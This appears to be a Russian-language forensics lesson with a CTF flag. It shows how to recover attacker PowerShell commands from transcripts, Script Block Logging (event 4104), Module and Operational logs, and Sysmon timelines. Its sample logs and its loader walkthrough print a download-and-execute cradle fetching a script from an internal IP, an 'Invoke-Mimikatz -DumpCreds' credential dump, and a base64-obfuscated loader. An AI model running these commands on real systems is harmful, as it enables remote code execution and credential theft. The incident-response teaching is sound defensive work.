## Вопрос, с которого всё начинается

Ты разбираешь инцидент, и есть подозрение, что злоумышленник работал через
**PowerShell**. Командная история (`ConsoleHost_history.txt`) пуста или подчищена. Как
узнать, **какие команды выполнялись**?

Оказывается, PowerShell умеет вести несколько независимых журналов, и даже если один
подчищен, другие часто остаются. Разберём сквозной пример: восстановим скрипт атакующего
из журналов.

## Четыре источника логов PowerShell

У PowerShell есть **четыре** разных механизма журналирования, и каждый даёт свой взгляд:

- **Transcription** — текстовый файл-«стенограмма» всей сессии. Пишется на диск (если
  включено), лежит в каталоге `...\Documents\PowerShell_transcript.*.txt`.
- **Script Block Logging** — журнал событий, куда пишется **исходный код** каждого
  выполненного блока (Event ID 4104), даже если команда была закодирована.
- **Module Logging** — журналирование вызовов командлетов конкретных модулей.
- **Operational log** — канал `Microsoft-Windows-PowerShell/Operational` с событиями
  запуска/остановки движка.

Важно: Script Block Logging пишет **то, что реально исполняется**, уже **после**
деобфускации. Поэтому даже если в командной строке был закодированный blob, в 4104
попадёт расшифрованный код.

## Наш пример: стенограмма сессии

На диске ищем транскрипты:

```
$ find . -name 'PowerShell_transcript*'
./Documents/PowerShell_transcript.WKSTN01.jdoe.20260314-021133.txt
```

Открываем:

```
$ cat PowerShell_transcript.WKSTN01.jdoe.20260314-021133.txt
**********************
Windows PowerShell transcript start
Start time: 20260314021133
Username: CORP\jdoe
**********************
PS> IEX (New-Object Net.WebClient).DownloadString('http://10.10.20.9/a.ps1')
PS> Invoke-Mimikatz -DumpCreds
PS> $flag = 'nto{p0w3rsh3ll_tr4nscr1pt_l34k}'
```

Вот и флаг — переменная, оставшаяся в стенограмме. Транскрипт — это **простейший**
источник: обычный текст, читается глазами.

## Если транскрипт выключен: Script Block Logging

Часто транскрипты не включены. Тогда смотрим журнал 4104:

```
$ evtx_dump.py PowerShell-Operational.evtx | grep -A3 '4104'
<EventID>4104</EventID>
<ScriptBlockText>IEX (New-Object Net.WebClient).DownloadString('http://10.10.20.9/a.ps1')</ScriptBlockText>
<EventID>4104</EventID>
<ScriptBlockText>Invoke-Mimikatz -DumpCreds</ScriptBlockText>
```

Здесь виден **исходный код** блоков. Даже если атакующий запускал
`powershell -enc <base64>`, в 4104 попадёт уже расшифрованный текст — потому что движок
логирует блок **перед** исполнением, после разбора.

### Разбор закодированной команды

Если в истории остался только base64 (например, из-за включённого логирования командной
строки, но не блоков), его декодируют. Base64 в PowerShell — это **UTF-16LE**, поэтому
обычный `base64 -d` даст текст с «нулевыми» байтами:

```
$ echo 'SQBFAFgAIAAoAE4AZQB3AC0AT...' | base64 -d | xxd | head -2
00000000: 4900 4500 5800 2000 2800 4e00 6500 7700  I.E.X. .(.N.e.w.
```

Видно чередование символа и нуля — это UTF-16LE. Убрать нули можно, декодируя как
UTF-16, а не как ASCII. Практический вывод: **при декодировании `-enc` учитывай
UTF-16LE**, иначе получишь «мешанину».

## Обфускация и её следы

Атакующие прячут код разными способами:

- **Строковая конкатенация**: `'Invo'+'ke-Mi'+'mikatz'`.
- **Обратный порядок**: `-join [char[]]...`.
- **Переменные-плейсхолдеры**: `& ($x)`.
- **Format-оператор**: `'{0}{1}' -f 'IEX','...'`.

Script Block Logging фиксирует **итоговый** блок, поэтому часть обфускации «схлопывается».
Но иногда видно и промежуточные блоки — например, строку, собранную из кусков. Поэтому
4104 анализируют целиком, а не только последнюю запись.

## Корреляция и таймлайн

Событие 4104 содержит **ScriptBlock ID** и **MessageNumber/MessageTotal**. Большой скрипт
пишется несколькими частями — их собирают по ID. Сопоставляя время 4104 с событиями
запуска процессов (4688/1) и сетевыми подключениями, строят таймлайн: **что запущено →
какой код выполнен → куда пошёл трафик**.

## Разбор реального кейса: обфусцированный загрузчик

Рассмотрим, как выглядит типичный обфусцированный PowerShell-загрузчик и что от него
остаётся в журналах. Атакующий часто использует такой приём: собирает строку из кусков,
декодирует base64 и исполняет результат.

```
$raw = 'SUVYIChOZXctT2JqZWN0IE5ldC5XZWJDbGllbnQpLkRvd25sb2FkU3RyaW5nKCJodHRwOi8vMTAuMTAuMjAuOS9hLnBzMSIp'
$code = [Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($raw))
IEX $code
```

Что тут происходит по шагам: переменная `$raw` содержит base64; `FromBase64String`
превращает её в байты; `GetString` собирает из байтов текст; `IEX` исполняет текст. В
журнале Script Block Logging (4104) появятся **все три блока**: присваивание `$raw`,
декодирование и вызов `IEX`. Даже если сам закодированный текст в логе виден как base64,
**результат декодирования** (`IEX (New-Object Net.WebClient).DownloadString(...)`) тоже
попадёт в лог как отдельный блок — потому что движок логирует то, что реально исполняется.

Это ключевой момент для аналитика: не нужно вручную декодировать base64, если включён
Script Block Logging — итоговый код уже лежит в 4104. Но если лог выключен, base64 всё
равно можно раскодировать: помни про **UTF-16LE** (для `-enc`) или UTF-8 (для ручного
`FromBase64String`, как выше).

## Module Logging и Operational: что дополняют

**Module Logging** пишет вызовы командлетов выбранных модулей (например, `Microsoft.PowerShell.Core`)
с их параметрами. Это полезно, когда Script Block Logging выключен, а Module Logging —
включён: тогда видно хотя бы **имена** команд и аргументы.

**Operational log** фиксирует жизненный цикл движка: событие **400** (начало движка),
**403** (конец), **600** (провайдер запущен), **800** (выполнение конвейера). По времени
400/403 видно, **когда именно** работала сессия, даже если содержимое не записано.

Складывая источники, аналитик получает максимально полную картину: **когда** (Operational),
**что** (Script Block), **чем** (Module Logging) и, при наличии, **полную стенограмму**
(Transcription). Отсутствие одного из них не означает отсутствия активности — надо
проверять все четыре.

## Частые ошибки

- **Декодировать `-enc` как обычный base64.** Получишь текст с нулями; это UTF-16LE.
- **Искать только в ConsoleHost_history.txt.** Этот файл часто подчищают первым; журналы
  остаются.
- **Считать 4104 «шумом».** Именно там лежит исполненный код, в том числе после
  обфускации.
- **Пропускать многочастные скрипты.** Большой блок пишется несколькими событиями —
  собирай их по ScriptBlock ID.
- **Игнорировать кодировку консоли.** Вывод может быть в OEM-кодировке (CP866), а не
  UTF-8; учитывай при чтении стенограмм.

## Шпаргалка команд

```
# Найти стенограммы
find . -name 'PowerShell_transcript*'
# Дамп операционного журнала
evtx_dump.py PowerShell-Operational.evtx | grep -A3 '4104'
# Декодировать -enc (UTF-16LE)
python3 -c "import base64;print(base64.b64decode('<b64>').decode('utf-16-le'))"
# Собрать многочастный блок по ID
evtx_dump.py PowerShell-Operational.evtx | grep -E 'ScriptBlockId|MessageNumber|ScriptBlockText'
```

## Что это даёт в отчёте

В отчёте по PowerShell фиксируют: исполненные команды и скрипты, использованные приёмы
(скрытое окно, обфускация, загрузка из сети), сетевые адреса из скриптов и связь с
созданием процессов. Это восстанавливает «живую» картину атаки — ту, что не оставила
файлов на диске.

## Практический сценарий: собираем таймлайн PowerShell-атаки

Разберём ещё один сквозной сценарий, чтобы закрепить материал и показать, как из
разрозненных журналов собирается цельная история. Представь, что на хосте `WKSTN01`
пользователь `CORP\jdoe` открыл вложение из письма, и через несколько минут началась
сетевая активность на внешний адрес. Наша задача — восстановить цепочку.

Первым делом фиксируем время. В операционном журнале PowerShell событие 400 отмечает
запуск движка, а 403 — завершение сессии. Между ними лежат все события 4104. Выписываем
временные метки и сортируем: так мы получаем границы «сеанса PowerShell», внутри которого
ищем подозрительное.

Далее читаем блоки 4104 по порядку. Первый блок обычно содержит инициализацию —
импорт модулей, установку переменных. Среди них может быть объявлена функция-загрузчик.
Следующие блоки — её вызов и полезная нагрузка. Важно читать **последовательно**: смысл
появляется из порядка, а не из отдельной строки. Часто первая строка выглядит безобидно
(например, создание объекта), а вторая уже выполняет сетевую загрузку.

Затем сопоставляем с Sysmon. Событие 1 покажет процесс `powershell.exe` и его родителя
(`cmd.exe`, порождённый `WINWORD.EXE`). Событие 3 покажет исходящее соединение, событие 22
— DNS-запрос. Складывая эти данные, мы видим полную цепочку: **Office → cmd → скрытый
PowerShell → загрузка скрипта с внешнего адреса → исполнение**.

Отдельно проверяем, не оставил ли загрузчик файл на диске. Даже при работе «в памяти»
скрипт мог записать временный файл в `%TEMP%` или `AppData`. Событие 11 (FileCreate) в
Sysmon покажет это, а `strings` по найденному файлу даст дополнительные индикаторы.

Наконец, документируем находки. В отчёте фиксируем: точное время каждого шага, полные
командные строки, адреса и домены, хеши запущенных файлов, а также использованные приёмы
(скрытое окно, обход политики, обфускация). Такой таймлайн — прямой ответ на вопрос «что
произошло на хосте», и именно он превращает отдельные события в расследование.

Главный навык этого урока — не запоминание конкретных Event ID, а умение **связывать
источники**: транскрипт, Script Block, Sysmon и файловую систему. Ни один из них по
отдельности не даёт полной картины, но вместе они восстанавливают атаку почти по секундам.

## Что мы теперь знаем

- У PowerShell **четыре** независимых журнала; подчистка одного не удаляет остальные.
- **Transcription** — текстовый файл стенограммы на диске.
- **Script Block Logging (4104)** пишет **исходный код** блоков после разбора — даже для
  `-enc` команд.
- Base64 в PowerShell — это **UTF-16LE**; декодировать надо с учётом этого.
- Обфускация часто «схлопывается» в логе, но промежуточные блоки тоже полезны.
- Скрипт собирается по **ScriptBlock ID** из нескольких событий.

## Куда дальше

Мы восстановили исполненный код. Дальше разберём **Sysmon**: как его события дополняют
картину (создание процессов, сетевые соединения, изменения файлов) и как настраивать
фильтры. А пока главное запомни: **PowerShell ведёт несколько журналов, и Script Block
Logging отдаёт код даже после обфускации**.
